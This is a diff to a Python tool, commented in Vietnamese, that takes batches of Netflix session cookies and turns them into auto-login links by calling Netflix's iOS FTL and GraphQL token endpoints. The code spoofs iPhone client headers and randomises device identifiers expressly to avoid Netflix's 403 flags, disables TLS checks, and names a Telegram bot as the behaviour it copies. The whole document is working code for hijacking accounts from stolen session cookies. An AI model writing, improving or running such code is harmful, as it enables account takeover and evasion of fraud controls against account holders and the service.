@@ -1,18 +1,23 @@
 """
 Netflix Login Link Generator
 
-Multi-strategy generator: thử nhiều endpoint, scope, và profile khác nhau
-để tối đa khả năng tạo token từ các cookie ở nhiều format khác nhau.
+Token NATIVE (CHÍNH): iOS FTL Falcor — path ["account","token","default"].
+  Endpoint: https://ios.prod.ftl.netflix.com/iosui/user/<version>
+  → token mà APP NETFLIX NATIVE chấp nhận auto-login (giống @nf_getlink_bot):
+    mở app → load vài giây → vào thẳng chọn profile.
 
-Endpoint chính: https://android13.prod.ftl.netflix.com/graphql
-Operation: CreateAutoLoginToken (persisted query)
+Token WEBVIEW (FALLBACK): GraphQL createAutoLoginToken (scope WEBVIEW_MOBILE_STREAMING).
+  → CHỈ redeem được trên trình duyệt web; app native sẽ hiện màn đăng nhập.
 
 Ref: github.com/harshitkamboj/Netflix-NFToken-Generator
 """
 import json
 import re
 import random
+import string
 import time
+import uuid
+import urllib.parse
 from datetime import datetime, timezone
 
 import requests
@@ -26,51 +31,21 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", "flwssn", "gsid")
 
-# ─── Multi-strategy configuration ────────────────────────────────────────────────
+# ─── GraphQL (FALLBACK — token webview, chỉ web redeem được) ─────────────────────
 
 # Strategy = (graphql_url, scope, user_agent, description)
 STRATEGIES = [
-    # Strategy 0: Android 13 (original, most common)
     (
         "https://android13.prod.ftl.netflix.com/graphql",
         {"scope": "WEBVIEW_MOBILE_STREAMING"},
         "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
-        "Android 13 — WEBVIEW_MOBILE_STREAMING",
+        "GraphQL WEBVIEW_MOBILE_STREAMING",
     ),
-    # Strategy 1: Android 13, INHOME_COALESCE scope
-    (
-        "https://android13.prod.ftl.netflix.com/graphql",
-        {"scope": "INHOME_COALESCE"},
-        "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
-        "Android 13 — INHOME_COALESCE",
-    ),
-    # Strategy 2: Android 13, WEBVIEW_MOBILE_NEXT
-    (
-        "https://android13.prod.ftl.netflix.com/graphql",
-        {"scope": "WEBVIEW_MOBILE_NEXT"},
-        "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
-        "Android 13 — WEBVIEW_MOBILE_NEXT",
-    ),
-    # Strategy 3: web endpoint alternative (persisted query v101)
-    (
-        "https://android13.prod.ftl.netflix.com/graphql",
-        {"scope": "WEBVIEW_MOBILE_STREAMING"},
-        "Mozilla/5.0 (Linux; Android 13; M2007J3SG Build/TQ1A.230205.001.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.152 Safari/537.36",
-        "Android Chrome UA",
-    ),
-    # Strategy 4: TV/Xiaomi variant
-    (
-        "https://android13.prod.ftl.netflix.com/graphql",
-        {"scope": "TV8K_STREAMING"},
-        "com.netflix.mediaclient/238320093 (Linux; U; Android 11; ro; M2102K1G; Build/RKQ1.200826.002; Cronet/TTWVersion.13370037)",
-        "Android TV",
-    ),
-    # Strategy 5: Fallback web prod
     (
         "https://web.prod.ftl.netflix.com/graphql",
         {"scope": "WEBVIEW_MOBILE_STREAMING"},
         "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
-        "Web FTL — WEBVIEW_MOBILE_STREAMING",
+        "GraphQL web.prod WEBVIEW_MOBILE_STREAMING",
     ),
 ]
 
@@ -91,13 +66,24 @@ BASE_HEADERS_COMMON = {
     "Referer": "https://www.netflix.com/",
 }
 
+# ─── iOS FTL (Falcor) — token NATIVE "account.token.default" ─────────────────────
+# Đây là token mà app Netflix native auto-login được (giống @nf_getlink_bot).
+# Thử lần lượt nhiều version; version nào còn sống thì dùng.
+FTL_VERSIONS = ("18.0", "17.0", "16.0", "15.48")
+
+_FTL_CONFIG_BLOB = (
+    '{"gamesInTrailersEnabled":"false","kidsBillboardEnabled":"true",'
+    '"baselineOnIpadEnabled":"true","postPlayPreviewsEnabled":"false","roarEnabled":"false",'
+    '"kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true",'
+    '"contentWarningEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}'
+)
+
 
 # ─── Cookie parser ────────────────────────────────────────────────────────────
 
 def _decode_cookie_value(value: str) -> str:
     if isinstance(value, str) and "%" in value:
         try:
-            import urllib.parse
             return urllib.parse.unquote(value)
         except Exception:
             return value
@@ -169,7 +155,6 @@ def split_cookie_blocks(raw: str) -> list:
         return paragraphs
 
     # 4. Dòng bắt đầu bằng SecureNetflixId= HOẶC NetflixId= → mỗi dòng là 1 block
-    # Đây là pattern phổ biến nhất trong batch mới: mỗi dòng là 1 cookie
     lines = text.split("\n")
     line_blocks = []
     current = []
@@ -178,7 +163,6 @@ def split_cookie_blocks(raw: str) -> list:
         stripped = line.strip()
         if not stripped:
             continue
-        # Dòng bắt đầu block mới
         if stripped.startswith("SecureNetflixId=") or stripped.startswith("NetflixId="):
             if current:
                 joined = " ".join(current)
@@ -196,7 +180,7 @@ def split_cookie_blocks(raw: str) -> list:
     if len(line_blocks) >= 2:
         return line_blocks
 
-    # 5. Raw: dùng anchor NetflixId= hoặc SecureNetflixId= ở đầu dòng / sau \n
+    # 5. Raw: anchor NetflixId= hoặc SecureNetflixId= ở đầu dòng / sau \n
     anchor_pat = re.compile(
         r"(?:^|\n)\s*(NetflixId=|SecureNetflixId=)",
         re.IGNORECASE
@@ -230,15 +214,10 @@ def split_cookie_blocks(raw: str) -> list:
 
 
 def _fill_missing_shared_cookies(block_dicts: list) -> list:
-    """
-    Quét toàn batch để tìm nfvdid từ bất kỳ block nào có nó.
-    Sau đó gán cho các block thiếu.
-    Thứ tự ưu tiên: block cùng profile gần nhất > block gần nhất trong batch.
-    """
+    """Quét toàn batch tìm nfvdid; gán cho block thiếu."""
     if not block_dicts:
         return block_dicts
 
-    # Tìm tất cả nfvdid trong batch
     all_nfvdids = []
     for cd in block_dicts:
         if cd.get("nfvdid"):
@@ -247,10 +226,8 @@ def _fill_missing_shared_cookies(block_dicts: list) -> list:
     if not all_nfvdids:
         return block_dicts
 
-    # Gán nfvdid cho block thiếu
     for cd in block_dicts:
         if not cd.get("nfvdid") and all_nfvdids:
-            # Ưu tiên dùng nfvdid đầu tiên tìm được
             cd["nfvdid"] = all_nfvdids[0]
 
     return block_dicts
@@ -305,14 +282,11 @@ def parse_cookies(raw: str) -> dict:
 
     # 2) JSON-fragment (JSON hỏng / cắt dở / name-value không liền nhau):
     if not all(k in cookie_dict for k in ("NetflixId", "SecureNetflixId", "nfvdid")):
-        # 2a) Quét từng object {...} hoàn chỉnh (bất kể thứ tự name/value).
         for obj in re.findall(r"\{[^{}]*\}", text):
             nm = re.search(r'"name"\s*:\s*"([^"]+)"', obj, re.IGNORECASE)
             vl = re.search(r'"value"\s*:\s*"([^"]*)"', obj, re.IGNORECASE)
             if nm and vl:
                 _take(nm.group(1), vl.group(1))
-        # 2b) Object chưa đóng ngoặc (paste thiếu đuôi) / rải rác: bắt
-        #     "name":"KEY" rồi lấy "value" gần nhất (ưu tiên ngay sau).
         for key in COOKIE_KEYS:
             if key in cookie_dict:
                 continue
@@ -330,8 +304,6 @@ def parse_cookies(raw: str) -> dict:
                 _take(key, vm.group(1))
 
     # 3) Chuỗi thô — tách name/value bằng '='  |  ':'  |  TAB (Netscape):
-    #       NAME=value   /   NAME: value   /   NAME<TAB>value   /   NAME="value"
-    #    Cho phép value bọc nháy "..." / '...'; nếu không thì cắt ở ; , khoảng trắng nháy.
     for key in COOKIE_KEYS:
         if key in cookie_dict:
             continue
@@ -371,69 +343,144 @@ def _fmt_expiry(expiry) -> str:
         return str(expiry)
 
 
-def _build_result(token: str, expiry, strategy_name: str) -> dict:
+def _build_result(pc_token: str, mobile_token: str, expiry, method_name: str) -> dict:
     return {
         "ok": True,
-        "pc": PC_LOGIN_BASE + token,
-        "mobile": MOBILE_LOGIN_BASE + token,
+        "pc": PC_LOGIN_BASE + pc_token,         # web: token webview (đã xác nhận chạy web)
+        "mobile": MOBILE_LOGIN_BASE + mobile_token,  # app: token native (auto-login như bot)
         "expiry": _fmt_expiry(expiry),
-        "build_id": "android/63884",
-        "strategy": strategy_name,
+        "build_id": method_name,
+        "strategy": method_name,
     }
 
 
 def _build_cookie_header(cookies_dict: dict) -> str:
-    """Build cookie header với tất cả cookies có sẵn."""
+    """
+    Build cookie header gửi cho Netflix.
+    Gửi đúng dạng TRÌNH DUYỆT lưu = URL-encoded (NetflixId/SecureNetflixId chứa = & .).
+    parse_cookies đã decode value → ở đây encode lại để khớp dạng gốc.
+    """
     parts = []
     for key in COOKIE_KEYS:
         value = cookies_dict.get(key)
-        if value:
-            parts.append(f"{key}={value}")
+        if not value:
+            continue
+        if "%" not in value:  # value đã decode → encode lại về dạng browser gửi
+            value = urllib.parse.quote(value, safe="-_.~")
+        parts.append(f"{key}={value}")
     return "; ".join(parts)
 
 
-# ─── Core token fetch với multi-strategy ────────────────────────────────────
+# ─── Token NATIVE qua iOS FTL (account.token.default) ────────────────────────
 
-def _fetch_token(cookies_dict: dict, strategy_idx: int, attempt: int) -> dict:
-    """
-    Gửi request GraphQL với strategy cụ thể.
-    """
+def _gen_esn() -> str:
+    """ESN random mỗi request — hardcode ESN sẽ bị Netflix flag (403)."""
+    chars = string.digits + string.ascii_uppercase
+    return "NFAPPL-02-IPHONE8=1-PXA-" + "".join(random.choice(chars) for _ in range(128))
+
+
+def _ftl_params(version: str, esn: str) -> dict:
+    return {
+        "appVersion": f"{version}.1", "config": _FTL_CONFIG_BLOB, "device_type": "NFAPPL-02-",
+        "esn": esn, "idiom": "phone", "iosVersion": "18.5", "isTablet": "false",
+        "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375", "model": "saget",
+        "modelType": "IPHONE8-1", "odpAware": "true",
+        "path": '["account","token","default"]', "pathFormat": "graph",
+        "progressive": "false", "responseFormat": "json",
+    }
+
+
+def _ftl_headers(version: str, esn: str, cookie_header: str) -> dict:
+    return {
+        "User-Agent": f"Argo/{version}.1 (iPhone; iOS 18.5; Scale/2.00)",
+        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~' + version + '.0/user","control_tag":"iosui_argo"}',
+        "x-netflix.context.app-version": f"{version}.1",
+        "x-netflix.argo.translated": "true",
+        "x-netflix.context.form-factor": "phone",
+        "x-netflix.client.appversion": f"{version}.1",
+        "x-netflix.client.type": "argo",
+        "x-netflix.client.ftl.esn": esn,
+        "x-netflix.context.locales": "en-US",
+        "x-netflix.context.top-level-uuid": str(uuid.uuid4()).upper(),
+        "x-netflix.client.iosversion": "18.5",
+        "x-netflix.context.os-version": "18.5",
+        "x-netflix.context.ui-flavor": "argo",
+        "x-netflix.client.brand": "Apple",
+        "x-netflix.client.model": "iPhone",
+        "Cookie": cookie_header,
+    }
+
+
+def _fetch_token_ftl(cookies_dict: dict) -> dict:
+    """Lấy token NATIVE qua iOS FTL account.token.default. Thử nhiều version."""
+    cookie_header = _build_cookie_header(cookies_dict)
+    logs = []
+    for version in FTL_VERSIONS:
+        time.sleep(random.uniform(0.2, 0.6))
+        esn = _gen_esn()
+        url = f"https://ios.prod.ftl.netflix.com/iosui/user/{version}"
+        log = {"method": f"FTL iosui/{version}", "url": url, "status": None, "preview": ""}
+        try:
+            resp = requests.get(url, params=_ftl_params(version, esn),
+                                headers=_ftl_headers(version, esn, cookie_header),
+                                timeout=20, verify=False)
+            log["status"] = resp.status_code
+            log["preview"] = (resp.text or "")[:300]
+        except requests.RequestException as e:
+            log["status"] = "ERR"
+            log["preview"] = str(e)[:200]
+            logs.append(log)
+            continue
+
+        logs.append(log)
+        if resp.status_code != 200:
+            continue
+        try:
+            data = resp.json()
+        except Exception:
+            data = None
+
+        token = None
+        expires = None
+        if isinstance(data, dict):
+            try:
+                tk = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+                token = tk.get("token")
+                expires = tk.get("expires")
+            except Exception:
+                token = None
+        if not token:
+            m = re.search(r'"token"\s*:\s*"([^"]+)"', resp.text or "")
+            if m:
+                token = m.group(1)
+        if token:
+            return {"token": token, "expires": expires, "logs": logs,
+                    "method": f"iOS FTL native (iosui/{version})"}
+    return {"token": None, "expires": None, "logs": logs, "method": None}
+
+
+# ─── GraphQL fallback (token webview) ────────────────────────────────────────
+
+def _fetch_token(cookies_dict: dict, strategy_idx: int) -> dict:
+    """Gửi request GraphQL createAutoLoginToken (token webview — fallback)."""
     url, scope, user_agent, strategy_name = STRATEGIES[strategy_idx]
 
-    time.sleep(random.uniform(0.2, 1.0))
+    time.sleep(random.uniform(0.2, 0.8))
 
     headers = dict(BASE_HEADERS_COMMON)
     headers["User-Agent"] = user_agent
     headers["Cookie"] = _build_cookie_header(cookies_dict)
 
-    payload = {
-        **GRAPHQL_PAYLOAD_BASE,
-        "variables": scope,
-    }
+    payload = {**GRAPHQL_PAYLOAD_BASE, "variables": scope}
 
-    log = {
-        "strategy": strategy_name,
-        "strategy_idx": strategy_idx,
-        "url": url,
-        "status": None,
-        "len": 0,
-        "preview": "",
-    }
-
+    log = {"method": strategy_name, "url": url, "status": None, "preview": ""}
     try:
-        resp = requests.post(
-            url,
-            headers=headers,
-            json=payload,
-            timeout=30,
-            verify=False,
-        )
+        resp = requests.post(url, headers=headers, json=payload, timeout=30, verify=False)
         log["status"] = resp.status_code
-        log["len"] = len(resp.text or "")
-        log["preview"] = (resp.text or "")[:800]
+        log["preview"] = (resp.text or "")[:300]
     except requests.RequestException as e:
         log["status"] = "ERR"
-        log["preview"] = str(e)[:300]
+        log["preview"] = str(e)[:200]
         return {"log": log, "token": None, "expires": None}
 
     if resp.status_code != 200:
@@ -442,108 +489,69 @@ def _fetch_token(cookies_dict: dict, strategy_idx: int, attempt: int) -> dict:
     try:
         data = resp.json()
     except Exception:
-        return {"log": log, "token": None, "expires": None}
+        data = None
 
     token = None
-    expires = None
-
     if isinstance(data, dict):
         payload_data = data.get("data")
         if isinstance(payload_data, dict):
             token = payload_data.get("createAutoLoginToken")
-        if not token:
-            try:
-                tm = re.search(r'"createAutoLoginToken"\s*:\s*"([^"]+)"', resp.text)
-                if tm:
-                    token = tm.group(1)
-            except Exception:
-                pass
+    if not token:
+        m = re.search(r'"createAutoLoginToken"\s*:\s*"([^"]+)"', resp.text or "")
+        if m:
+            token = m.group(1)
 
-    return {"log": log, "token": token, "expires": expires}
+    return {"log": log, "token": token, "expires": None}
 
 
 # ─── Main generation function ────────────────────────────────────────────────
 
 def get_login_links(cookies_dict: dict) -> dict:
     """
-    Lấy login link từ cookies.
-    Thử tất cả strategies để tối đa khả năng thành công.
+    Tạo login link từ cookies (DUAL-TOKEN):
+      • Mobile link → token NATIVE (iOS FTL account.token.default) → app auto-login như @nf_getlink_bot.
+      • PC link     → token WEBVIEW (GraphQL createAutoLoginToken)  → đã xác nhận redeem trên web.
+    Lấy được token nào dùng token đó; thiếu loại nào thì lấp bằng loại kia.
     """
     if not cookies_dict.get("NetflixId"):
         return {"ok": False, "error": "Thiếu cookie: NetflixId"}
 
-    if not cookies_dict.get("SecureNetflixId"):
-        return {"ok": False, "error": "Thiếu cookie: SecureNetflixId"}
-
-    # Nếu thiếu nfvdid, vẫn thử — nhiều cookie vẫn chạy được
-    missing_nfvdid = not cookies_dict.get("nfvdid")
-
     all_debug = []
-    error_hints = []
 
-    # Thử mỗi strategy
+    # 1) Token NATIVE qua iOS FTL (cho MOBILE — app auto-login)
+    ftl = _fetch_token_ftl(cookies_dict)
+    all_debug.extend(ftl["logs"])
+    native = ftl["token"]
+    expiry = ftl["expires"]
+
+    # 2) Token WEBVIEW qua GraphQL (cho PC/web)
+    webview = None
     for sidx in range(len(STRATEGIES)):
-        strategy_name = STRATEGIES[sidx][3]
+        result = _fetch_token(cookies_dict, sidx)
+        all_debug.append(result["log"])
+        if result["token"]:
+            webview = result["token"]
+            break
+        if result["log"].get("status") == "ERR":
+            break  # lỗi mạng → khỏi spam strategy còn lại
 
-        for attempt in range(1, 3):
-            result = _fetch_token(cookies_dict, sidx, attempt)
-            all_debug.append(result["log"])
-
-            if result["token"]:
-                return {
-                    **_build_result(result["token"], result["expires"], strategy_name),
-                    "debug": all_debug,
-                }
-
-            # Phân tích lỗi
-            preview = result["log"].get("preview", "")
-            status = result["log"].get("status")
-
-            if status == 200 and "PERMISSION_DENIED" in preview:
-                error_hints.append(f"Strategy {strategy_name}: PERMISSION_DENIED")
-                break  # strategy này không work, chuyển strategy khác
-            elif status == 200 and "DetailedAccessDeniedException" in preview:
-                error_hints.append(f"Strategy {strategy_name}: AccessDeniedException")
-                break
-            elif status == 200 and "data\":null" in preview:
-                error_hints.append(f"Strategy {strategy_name}: data=null")
-                break
-            elif status == 200 and '"errors"' in preview:
-                err_match = re.search(r'"message"\s*:\s*"([^"]+)"', preview)
-                if err_match:
-                    error_hints.append(f"Strategy {strategy_name}: {err_match.group(1)[:80]}")
-                break
-            elif status == "ERR":
-                error_hints.append(f"Strategy {strategy_name}: connection error")
-                break
-
-            if attempt < 2:
-                time.sleep(random.uniform(0.5, 1.5))
-
-    last = all_debug[-1] if all_debug else {}
-
-    # Xây dựng error message rõ ràng
-    status = last.get("status")
-    preview = last.get("preview", "")
-
-    if missing_nfvdid:
-        hint = " — Cookie không có nfvdid (có thể không cần)"
-    else:
-        hint = ""
-
-    if error_hints:
-        err_summary = "; ".join(error_hints[:3])
+    if not native and not webview:
         return {
             "ok": False,
-            "error": f"Cookies die{hint}",
+            "error": "Cookies die (FTL native + GraphQL đều không cấp token)",
             "debug": all_debug,
         }
 
-    return {
-        "ok": False,
-        "error": f"Cookies die{hint}",
-        "debug": all_debug,
-    }
+    pc_token = webview or native        # web: ưu tiên webview (đã xác nhận); thiếu thì dùng native
+    mobile_token = native or webview    # app: bắt buộc native; thiếu thì đành webview
+    if native and webview:
+        method = "FTL native (mobile) + GraphQL webview (pc)"
+    elif native:
+        method = "FTL native (cả 2 link)"
+    else:
+        method = "GraphQL webview (web-only — app native sẽ hiện login)"
+
+    return {**_build_result(pc_token, mobile_token, expiry, method), "debug": all_debug}
 
 
 # ─── Debug probe ──────────────────────────────────────────────────────────────
@@ -565,15 +573,13 @@ def probe_endpoint(cookies_dict: dict, url: str, method: str = "POST") -> dict:
         return {
             "status": resp.status_code,
             "body": body_preview,
-            "build_id": "android/63884",
             "cookies_sent": list(cookies_dict.keys()),
-            "token_found": "createAutoLoginToken" in body_preview,
+            "token_found": ("createAutoLoginToken" in body_preview) or ('"token"' in body_preview),
         }
     except Exception as e:
         return {
             "status": "ERR",
             "body": str(e)[:300],
-            "build_id": "android/63884",
             "cookies_sent": list(cookies_dict.keys()),
             "token_found": False,
         }
